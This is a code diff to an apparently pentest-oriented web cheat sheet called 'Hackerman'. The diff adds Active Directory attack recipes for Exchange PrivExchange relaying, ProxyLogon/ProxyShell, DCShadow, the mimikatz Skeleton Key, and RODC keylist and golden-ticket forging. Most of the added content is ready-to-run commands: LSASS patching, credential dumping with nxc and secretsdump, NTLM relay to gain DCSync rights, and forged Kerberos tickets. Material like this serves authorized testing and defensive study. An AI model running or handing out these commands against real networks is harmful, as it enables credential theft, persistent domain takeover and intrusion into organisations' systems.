+R({id:'exchange',cat:'post',title:'Exchange Server — PrivExchange, ProxyLogon/ProxyShell',desc:'Exchange in scope? Fingerprint the build, push-subscribe to coerce its machine account, or hit version-gated RCE — then chain to DA.',
+cmds:[
+ [`nmap -p 443,80 --script http-title {{target_ip}}`,'find OWA/ECP (Exchange web)'],
+ [`curl -sk https://{{target_ip}}/owa/auth/logon.aspx -D - -o /dev/null | grep -i 'x-owa-version'`,'Exchange build via OWA headers'],
+ [`git clone https://github.com/dirkjanm/PrivExchange.git`,'get privexchange.py'],
+ [`python3 privexchange.py -ah {{attacker_ip}} {{target_host}} -u '{{user}}' -p '{{password}}' -d {{domain}}`,'PrivExchange: push subscription → Exchange auths to you'],
+ [`impacket-ntlmrelayx --smb2support -t ldaps://{{dc_ip}} --escalate-user '{{user}}'`,'relay Exchange$ → DCSync rights for your user','n'],
+ [`# build ≤ mid-2021 → CVE-2021-26855 ProxyLogon (unauth SSRF → webshell) / CVE-2021-34473+31297 ProxyShell (auth RCE) → public PoC → dump`,'version-gated RCE needs external tooling','n']
+],note:'PrivExchange needs an attacker-resolvable name (ADIDNS helps) plus a listener (Responder/ntlmrelayx); relay the machine account to LDAP(S) without signing (see relay-ldap) or to ADCS (ESC8). ProxyLogon/ProxyShell are dead on patched builds — fingerprint first, exploit second. After RCE: SAM/LSA/DPAPI on the Exchange host, then DCSync with the machine account.'});
+
+R({id:'dcshadow',cat:'post',title:'DCShadow — fake-DC replication persistence',desc:'Register a rogue DC, push arbitrary replication (e.g. SID history), unregister. mimikatz-only, needs DA.',
+cmds:[
+ [`mimikatz "lsadump::dcshadow /object:CN={{target_user}},CN=Users,{{domain_dn}} /attribute:SIDHistory /value:{{domain_sid}}-519"`,'stage the change (example: EA SID history)','n'],
+ [`mimikatz "lsadump::dcshadow /push"`,'push via replication from your rogue DC','n'],
+ [`mimikatz "lsadump::dcshadow /object:CN={{target_user}},CN=Users,{{domain_dn}} /attribute:SIDHistory /value:<ORIGINAL>"`,'CLEANUP: push the original value back, then /push','n'],
+ [`# remove the rogue server object + SPNs (ADUC/ldp)`,'CLEANUP: unregister the fake DC','n']
+],note:'Needs DA (SPN + server-object registration; mimikatz handles it) and a Windows session — no UNIX tooling exists. Pushes any attribute (SIDHistory, SPN, ...), so it composes with DACL/RBCD/krbtgt persistence. Real replication = survives reboots; detectable via replication metadata (changed objects without matching logons).'});
+
+R({id:'skeleton',cat:'post',title:'Skeleton Key — master password on the DC',desc:'LSASS patch: one password works for every account (NTLM + RC4-Kerberos). In-memory only.',
+cmds:[
+ [`mimikatz "privilege::debug" "misc::skeleton"`,'inject (SYSTEM or DA + SeDebug on the DC; default password mimikatz)','n'],
+ [`nxc smb {{dc_host}} -u '{{target_user}}' -p 'mimikatz'`,'log in as anyone with the master password'],
+ [`# reboot the DC to clear the patch`,'CLEANUP: reboot clears the in-memory patch','n']
+],note:'Works up to Server 2019; NTLM + RC4-Kerberos only (no AES). Loud by design (LSASS patch, AV/EDR) — reboot clears it, so pair with durable persistence (golden ticket/cert).'});
+
+R({id:'rodc',cat:'post',title:'RODC abuse — reveal list, keylist attack, RODC golden tickets',desc:'Admin on a read-only DC? Dump what it may cache, keylist-attack the rest, forge RODC-scoped tickets.',
+cmds:[
+ [`nxc smb {{target_host}} -u '{{user}}' -p '{{password}}' --sam --lsa`,'dump allowed-cached creds on the RODC (needs admin there)'],
+ [`nxc smb {{target_host}} -u '{{user}}' -H '{{nthash}}' --sam --lsa`,'dump allowed-cached creds — via PtH'],
+ [`LDAPTLS_REQCERT=never ldapsearch -x -H ldaps://{{dc_ip}} -D '{{user}}@{{domain}}' -w '{{password}}' -b 'OU=Domain Controllers,{{domain_dn}}' '(objectClass=computer)' msDS-RevealOnDemandGroup msDS-NeverRevealGroup`,'who may be cached (reveal vs never-reveal)'],
+ [`impacket-secretsdump '{{domain}}/{{user}}:{{password}}@{{dc_host}}' -just-dc-user 'krbtgt_<RODC_NO>' -dc-ip {{dc_ip}}`,'RODC krbtgt key (needs DCSync rights on a writable DC)'],
+ [`keylistattack.py -rodcNo <RODC_NO> -rodcKey <KRBTGT_AES> '{{domain}}/{{user}}:{{password}}@{{dc_host}}' -full`,'dump all hashes via key list (impacket master)'],
+ [`keylistattack.py -rodcNo <RODC_NO> -rodcKey <KRBTGT_AES> -t '{{target_user}}' -kdc {{dc_ip}} LIST`,'single user, no SMB needed'],
+ [`Rubeus.exe golden /rodcNumber:<RODC_NO> /aes256:<KRBTGT_AES> /user:{{target_user}} /domain:{{domain}} /sid:{{domain_sid}} /nowrap /ptt`,'RODC golden ticket (Rubeus)','n'],
+ [`impacket-ticketer -nthash '<KRBTGT_NT>' -domain-sid {{domain_sid}} -domain {{domain}} -rodcNo <RODC_NO> '{{target_user}}'`,'ticketer variant (impacket PR — verify availability)']
+],note:'Only principals in the reveal list (minus never-reveal) are forgeable; the kvno must match rodcNo. A writable DC recalculates the PAC when issuing the ST, so no PAC crafting needed. Keylist + RODC golden both need the RODC krbtgt (admin on the RODC or DCSync). Also dumpable via <span class="mono">secretsdump -use-keylist</span>.'});
 
 /* ===== MSSQL ===== */
 R({id:'mssql-connect',cat:'mssql',title:'Connect to MSSQL',desc:'impacket-mssqlclient / nxc variants with password, hash or Kerberos.',
@@ -4019,7 +4092,7 @@ cmds:[
 const PRI_TIERS = {
   4: 'auth-check shares user-enum kerbrute bloodyad-writable kerberos-auth kerberoast ccache-usage adcs-find creds-sam-lsa lat-transfer pe-suites revshells bh-python bh-nxc',
   3: 'pth-check kerb-check anon-enum pw-spray ldap-dump ldap-tls bloodyad-basics bloodyad-enum bloodyad-groups bloodyad-password asrep gettgt getst golden-ticket deleg-enum rbcd-read rbcd-addcomputer rbcd-write rbcd-getst rbcd-use rbcd-bloodyad dc-rbcd constrained-getst adcs-esc1 adcs-esc6 dacl-enum dacl-genericall-user dacl-genericall-computer dacl-genericall-group dacl-forcechangepassword dacl-writedacl-dcsync shadow-creds creds-dcsync creds-dpapi linux-loot win-registry-loot relay-responder relay-smb relay-coerce lat-winrm lat-smb-exec lat-impacket-exec lat-impacket-extras rdp-auth post-seimpersonate av-defender uac-bypass bhcli-setup bhcli-recon bhcli-mark-owned',
-  2: 'session-hunt bloodyad-spn bloodyad-uac keytab targeted-kerberoast silver-ticket ticket-inspect spn-hijack-deleg unconstrained-coerce adcs-esc4 adcs-esc8 adcs-esc2-esc3 adcs-esc9-esc16 adcs-esc10 adcs-esc11 adcs-esc13 adcs-esc15 dacl-writeowner creds-gmsa creds-ntds-offline sebackup relay-ldap relay-rbcd relay-socks mitm6 lat-rdp post-gpo post-adidns dsrm dnsadmins bloodyad-badsuccessor bhcli-cypher mssql-connect mssql-xpcmdshell mssql-impersonate trust-enum trust-cross-domain-roast trust-sid-history trust-foreign-groups trust-dcsync trust-coerce-relay second-domain second-domain-recon second-domain-mark second-domain-abuse',
+  2: 'session-hunt bloodyad-spn bloodyad-uac keytab targeted-kerberoast silver-ticket ticket-inspect spn-hijack-deleg unconstrained-coerce adcs-esc4 adcs-esc8 adcs-esc2-esc3 adcs-esc9-esc16 adcs-esc10 adcs-esc11 adcs-esc13 adcs-esc15 dacl-writeowner creds-gmsa creds-ntds-offline sebackup relay-ldap relay-rbcd relay-socks mitm6 lat-rdp post-gpo post-adidns dsrm dnsadmins bloodyad-badsuccessor bhcli-cypher mssql-connect mssql-xpcmdshell mssql-impersonate trust-enum trust-cross-domain-roast trust-sid-history trust-foreign-groups trust-dcsync trust-coerce-relay second-domain second-domain-recon second-domain-mark second-domain-abuse exchange dcshadow skeleton rodc dollar-ticket',
   1: 'adcs-esc7 adcs-golden-cert adcs-esc17 adcs-esc5-esc12-esc14 dacl-adminsdholder cve-zerologon cve-nopac cve-printnightmare cve-certifried krbrelay entra-connect adfs-goldensaml sccm mssql-linked mssql-coerce mssql-alt-rce trust-raisechild bhcli-alternatives'
 };
 const FLOW_PRI = {creds:4, nopwn:4, foothold:4, hash:3, aes:3, keytab:3, rbcd:3, dcacl:3, constrained:3, adcs:3, dacl:3, da:3, unconstrained:2, mssql:2, trusts:2, gpo:2, 'second-domain':2};
@@ -4116,7 +4189,9 @@ const NEXT = {
   'bhcli-mark-owned':['bhcli-cypher'],
   'cve-zerologon':['creds-dcsync'], 'cve-nopac':['creds-dcsync'],
   'cve-certifried':['creds-dcsync'], 'cve-printnightmare':['flow:foothold'],
-  'dnsadmins':['creds-dcsync'], 'entra-connect':['creds-dcsync']
+  'dnsadmins':['creds-dcsync'], 'entra-connect':['creds-dcsync'],
+  'exchange':['creds-dcsync'], 'dcshadow':['flow:da'], 'skeleton':['flow:creds'],
+  'rodc':['flow:creds'], 'dollar-ticket':['linux-loot'],
 };
 const NEXT_ISSUES = [];
 function applyNextLinks(){
@@ -4164,6 +4239,11 @@ const HELP_TOOL = {
  'nxc': 'NetExec (formerly CrackMapExec): multi-protocol AD operations over smb/ldap/winrm/mssql — auth checks, enumeration, dumping (<b>--sam --lsa --ntds --dpapi</b>), modules with <b>-M</b> and command execution. Add <b>-k --use-kcache</b> for Kerberos and <b>--port 636</b> for LDAPS. RBCD usage is built in: <b>--delegate &lt;user&gt;</b> performs S4U2Self+S4U2Proxy after authenticating as the controlled account (<b>--self</b>, <b>--spn</b>, <b>--generate-st</b>, <b>--u2u</b>), but writing the RBCD attribute itself is not supported — use impacket-rbcd/bloodyAD.',
  'kerbrute': 'Kerberos toolkit for user enumeration via pre-auth error codes (no lockout) and password spraying. Always check the password policy first; throttle with <b>-t</b> if the DC throttles.',
  'coercer': 'Fires every known authentication-coercion vector at a target and points the authentication at your listener. Use <b>scan</b> to list viable methods, then <b>coerce</b> with a listener (Responder, ntlmrelayx, unconstrained host).',
+ 'timeroast-ng.py': 'Unauthenticated NTP roast (MS-SNTP) for computer/trust accounts — catches weak/default machine passwords. Crack with hashcat mode 31300 (--username). Same whitepaper adds computer-spraying and trustroasting.',
+ 'keylistattack.py': 'Dumps hashes via the Kerberos key-list extension (padata 161) using a compromised RODC krbtgt (-rodcKey + -rodcNo). Impacket master; also wired into secretsdump -use-keylist.',
+ 'GoldenGMSA.exe': 'Dumps KDS root keys (kdsinfo, DA/EA), reads gMSA account data (gmsainfo, low-priv), computes passwords (compute → base64 → MD4 = NT hash). pyGoldenGMSA is the Python alternative.',
+ 'privexchange.py': 'Pushes an Exchange subscription so its machine account authenticates to you — then relay to LDAP(S)/ADCS. Needs an attacker-resolvable name (ADIDNS helps).',
+ 'gettgtpkinit.py': 'PKINIT TGT from a certificate (PFX) — manual UnPAC-the-hash path together with getnthash.py; certipy shadow auto does both steps for you.',
  'ldapdomaindump': 'Dumps users, groups, computers, ACLs and the password policy to HTML/JSON/CSV for offline browsing. Simple bind with <span class="mono">-u DOMAIN\\user -p pass &lt;dc&gt;</span>; no TLS by default.',
  'ldapsearch': 'Generic LDAP query tool for attributes no other tooling covers. Prefer LDAPS <span class="mono">-H ldaps://&lt;dc&gt;</span> with <span class="mono">LDAPTLS_REQCERT=never</span>, or STARTTLS with <b>-ZZ</b>; simple binds on 389 send credentials in cleartext.',
  'nmap': 'Port scanner — here used to check which LDAP listeners a DC offers (389/636/3268/3269) and to fingerprint services before choosing the attack path.',
@@ -4234,6 +4314,11 @@ const HELP_ATTACK = {
  'post-gpo': 'GenericWrite on a GPO means you can push settings or immediate scheduled tasks to every machine in scope — code execution on the next gpupdate or forced refresh. Requires knowledge of the GPO structure and is noisy; prefer targeted objects when possible.',
  'post-adidns': 'AD-integrated DNS is writable via LDAP: hijack unregistered names or add a wildcard record to catch authentication or poison name resolution. Useful for coerced auth and internal phishing; clean up records afterwards.',
  'sccm': 'SCCM manages clients with machine-level credentials (Network Access Account, Client Push). Site systems often allow relay or client-enrollment abuse, leading to site or database takeover. Enumerate site servers and signing settings before attacking.',
+ 'exchange': 'Exchange Server exposes OWA/ECP plus a privileged machine account: PrivExchange coerces it to you (relay to LDAP/ADCS), ProxyLogon/ProxyShell give RCE on unpatched builds — both end at DA creds.',
+ 'dcshadow': 'Registers a rogue machine as a DC and pushes arbitrary replication (SID history, SPNs, ...). Needs DA and a Windows session (mimikatz-only); real replication, so it survives reboots — revert values + unregister afterwards.',
+ 'skeleton': 'Patches LSASS on a DC so one master password (default mimikatz) works for every account over NTLM and RC4-Kerberos. In-memory only (reboot clears), up to Server 2019, loud by design.',
+ 'rodc': 'A compromised read-only DC leaks what it may cache (reveal list); the rest falls to the keylist attack with the RODC krbtgt, and RODC golden tickets forge within reveal-minus-never-reveal (kvno = rodcNo).',
+ 'dollar-ticket': 'A machine account named after a local admin (root$) maps to that admin on Linux SSH/GSSAPI with default MIT mapping. Needs MAQ, a joined Linux target without strict PAC validation, and a policy-compliant password.',
  'mssql-linked': 'Linked servers run queries in the linked server context, often sysadmin. Chain with xp_cmdshell for code execution on the linked host, and follow links transitively when the first login has limited rights.',
  'mssql-impersonate': 'The IMPERSONATE permission lets a low-privileged login execute as another login, often sa. Enumerate available impersonations, escalate to sysadmin, then use xp_cmdshell or linked servers for OS access.',
  'linux-loot': 'Linux footholds hold Kerberos material (keytabs, ccache files) and application credentials — hunt for them before extracting anything. Check /etc/krb5.keytab, /tmp, home directories, configs and shell history first.',
@@ -4346,7 +4431,7 @@ function zshEmit(data){
   const fnName = n => '_hk_' + n.replace(/[^A-Za-z0-9_]/g, '_');
   const q = s => "'" + String(s).replace(/'/g, "'\\''") + "'";
   let out = '#compdef ' + names.concat(Object.keys(aliases)).join(' ') + '\n';
-  out += '# Hackerman v2.0.0 — generated from index.html. Regenerate: "zsh" button in the header or tools/gen-zsh-completions.mjs\n\n';
+  out += '# Hackerman v2.2.0 — generated from index.html. Regenerate: "zsh" button in the header or tools/gen-zsh-completions.mjs\n\n';
   out += '_hackerman() {\n  local tool=${words[1]:t}\n  case $tool in\n';
   names.forEach(n => { out += '    ' + n + ') ' + fnName(n) + ' ;;\n'; });
   Object.keys(aliases).forEach(a => { out += '    ' + a + ') ' + fnName(aliases[a]) + ' ;;\n'; });
@@ -4438,6 +4523,8 @@ const REQS = {
   'uac-bypass':['shell'], 'dsrm':['localadmin'], 'dnsadmins':['role','localadmin'],
   'cve-certifried':['creds','quota'], 'krbrelay':['shell','signingoff'], 'entra-connect':['creds','localadmin'],
   'adfs-goldensaml':['localadmin','artifact'],
+  'exchange':['creds'], 'dcshadow':['da'], 'skeleton':['da'], 'rodc':['localadmin','creds'],
+  'dollar-ticket':['creds','quota'],
   'mssql-connect':['mssql'], 'mssql-xpcmdshell':['mssql'], 'mssql-impersonate':['mssql'],
   'mssql-linked':['mssql'], 'mssql-coerce':['mssql','coercion'], 'mssql-alt-rce':['mssql'],
   'trust-enum':['creds'], 'trust-raisechild':['da'], 'trust-cross-domain-roast':['trustedcreds'],
